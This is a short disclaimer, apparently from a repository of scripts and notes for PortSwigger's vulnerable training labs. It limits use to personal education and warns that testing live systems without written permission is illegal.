These scripts and notes are for **personal educational use** on PortSwigger's intentionally vulnerable lab environment only.

Do not use these techniques against any live system without explicit written permission from the system owner. Unauthorised testing is illegal under computer fraud laws in most jurisdictions.
